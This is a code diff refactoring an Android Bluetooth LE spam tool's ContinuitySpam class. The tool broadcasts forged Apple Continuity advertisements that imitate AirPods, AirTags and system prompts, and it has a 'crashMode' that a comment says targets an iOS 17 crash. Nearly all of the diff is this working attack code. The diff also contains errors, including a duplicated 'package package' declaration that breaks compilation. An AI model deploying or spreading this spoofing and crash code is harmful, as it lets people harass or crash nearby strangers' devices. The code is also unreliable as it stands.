@@ -1,18 +1,93 @@
-package com.tutozz.blespam;
+package package com.tutozz.blespam;
 
 import android.bluetooth.le.AdvertiseData;
+import android.os.Handler;
+import android.os.Looper;
 
 import java.util.Random;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
 
-public class ContinuitySpam implements Spammer{
-    public Runnable blinkRunnable;
+/**
+ * Implements Continuity/Proximity spamming logic using a non-blocking Handler for cycling.
+ * Extends the abstract Spammer class.
+ */
+// 1. EXTENDS Spammer instead of IMPLEMENTS
+public class ContinuitySpam extends Spammer {
+
+    // Removed: public Runnable blinkRunnable; (Now inherited from Spammer)
+    // Removed: public boolean isSpamming = false; (Now inherited and managed by Spammer)
+    // Removed: private int loop = 0; (No longer needed)
+    // Removed: ExecutorService executor = Executors.newSingleThreadExecutor(); (No longer needed)
+    
     public ContinuityDevice[] devices;
-    private int loop = 0;
-    public boolean isSpamming = false;
     public boolean crashMode;
-    ExecutorService executor = Executors.newSingleThreadExecutor();
+
+    // Handler for scheduling the advertising cycle (must run on Main Looper)
+    private final Handler spamHandler = new Handler(Looper.getMainLooper());
+    private final BluetoothAdvertiser advertiser = new BluetoothAdvertiser();
+
+    // 2. Define the repeating advertising task
+    private final Runnable advertisingRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (!isSpamming) {
+                // Self-terminate if stop() was called while waiting for next run
+                return;
+            }
+
+            // 3. Spammer Logic (Modified to use Helper methods safely)
+
+            // Random device selection
+            // Use ThreadLocal Random from Helper for better practice
+            ContinuityDevice device = devices[Helper.RANDOM_THREAD_LOCAL.get().nextInt(devices.length)];
+            AdvertiseData data = null;
+
+            // Build Advertisement Data
+            if(device.getDeviceType() == ContinuityDevice.type.ACTION){
+                // Action Spamming
+                String rHex = Helper.randomHexFiller(6);
+                String manufacturerData = "0F05C0" + device.getValue() + rHex;
+                if(crashMode){ 
+                    // Crash Mode: appending extra data (e.g., for iOS 17 crash)
+                    manufacturerData = "0F05C0" + device.getValue() + rHex + "000010" + Helper.randomHexFiller(6); 
+                }
+                data = new AdvertiseData.Builder()
+                        .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
+                        .build();
+
+            } else if(device.getDeviceType() == ContinuityDevice.type.DEVICE){
+                // Device Modal Spamming
+                String continuityType = "07";
+                String size = "19";
+                String prefix = (device.getName().equals("Airtag")) ? "05" : "01";
+                
+                // Use ThreadLocal Random from Helper for random levels
+                Random random = Helper.RANDOM_THREAD_LOCAL.get();
+                String budsBatteryLevel = String.format("%02X", random.nextInt(10) * 10 + random.nextInt(10));
+                String caseBatteryLevel = String.format("%02X", random.nextInt(8) * 10 + random.nextInt(10));
+                String lidOpenCounter = String.format("%02X", random.nextInt(256));
+                String filler = Helper.randomHexFiller(32);
+                
+                data = new AdvertiseData.Builder()
+                        // Apple Company ID (0x004C)
+                        .addManufacturerData(0x004C, Helper.convertHexToByteArray(
+                            continuityType + size + prefix + device.getValue() + "55" + 
+                            budsBatteryLevel + caseBatteryLevel + lidOpenCounter + "0000" + filler)
+                        )
+                        .build();
+            }
+            
+            // 4. Advertise, then immediately stop to prepare for the next cycle
+            // NOTE: This relies on an external BluetoothAdvertiser class to handle the stop/start logic
+            advertiser.advertise(data, null); 
+            advertiser.stopAdvertising();
+            
+            // 5. Schedule the next run after the user-defined delay
+            // We use uiBlinkDelay (the user-controlled setting) to set the advertisement rate.
+            spamHandler.postDelayed(this, Helper.uiBlinkDelay);
+        }
+    };
+
+    // Constructor remains the same
     public ContinuitySpam(ContinuityDevice.type type, boolean crashMode) {
         this.crashMode = crashMode;
         // Init ContinuityDevices
@@ -60,57 +135,35 @@ public class ContinuitySpam implements Spammer{
         }
     }
 
+    // 3. Implements abstract start() method
+    @Override
     public void start() {
-        executor.execute(() -> {
-            BluetoothAdvertiser b = new BluetoothAdvertiser();
-            isSpamming = true;
-            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
-                if(isSpamming) {
-                    // Random device
-                    ContinuityDevice device = devices[new Random().nextInt(devices.length)];
-                    AdvertiseData data = null;
+        if (isSpamming) return;
 
-                    if(device.getDeviceType() == ContinuityDevice.type.ACTION){
-                        String rHex = Helper.randomHexFiller(6);
-                        String manufacturerData = "0F05C0" + device.getValue() + rHex;
-                        if(crashMode){ manufacturerData = "0F05C0" + device.getValue() + rHex + "000010" + rHex; }
-                        data = new AdvertiseData.Builder()
-                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(manufacturerData))
-                                .build();
-
-                    }else if(device.getDeviceType() == ContinuityDevice.type.DEVICE){
-                        String continuityType = "07";
-                        String size = "19";
-                        String prefix = "01";
-                        if(device.getName() == "Airtag") prefix = "05" ;
-                        String budsBatteryLevel = String.format("%02X",new Random().nextInt(10) * 10 + new Random().nextInt(10));
-                        String caseBatteryLevel = String.format("%02X",new Random().nextInt(8) * 10 + new Random().nextInt(10));
-                        String lidOpenCounter = String.format("%02X",new Random().nextInt(256));
-                        String filler = Helper.randomHexFiller(32);
-                        data = new AdvertiseData.Builder()
-                                .addManufacturerData(0x004C, Helper.convertHexToByteArray(continuityType + size + prefix + device.getValue() + "55" + budsBatteryLevel + caseBatteryLevel + lidOpenCounter + "0000" + filler))
-                                .build();
-                    }
-                    // Advertise
-                    b.advertise(data, null);
-                    // Wait before next advertise
-                    try {
-                        System.out.println(Helper.delay);
-                        Thread.sleep(Helper.delay);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                    // Stop this advertise to start the next one
-                    b.stopAdvertising();
-                }
-            }
-        });
+        // Use the inherited field
+        isSpamming = true;
+        
+        // Start the first advertising cycle immediately
+        spamHandler.post(advertisingRunnable);
     }
 
-    public boolean isSpamming(){
-        return isSpamming;
+    // 4. Implements abstract stop() method
+    @Override
+    public void stop() {
+        if (!isSpamming) return;
+
+        // Stop the scheduling immediately
+        spamHandler.removeCallbacks(advertisingRunnable);
+
+        // Stop the currently running advertisement
+        advertiser.stopAdvertising();
+        
+        // Use the inherited field
+        isSpamming = false;
+        
+        // Removed: loop = Helper.MAX_LOOP+1; (No longer needed)
     }
-    public void stop() { loop = Helper.MAX_LOOP+1; isSpamming = false; }
-    public Runnable getBlinkRunnable(){ return blinkRunnable; }
-    public void setBlinkRunnable(Runnable blinkRunnable){ this.blinkRunnable = blinkRunnable; }
+
+    // 5. Removed: isSpamming(), getBlinkRunnable(), setBlinkRunnable() 
+    // These methods are now handled by the inherited methods/fields of the abstract Spammer class.
 }
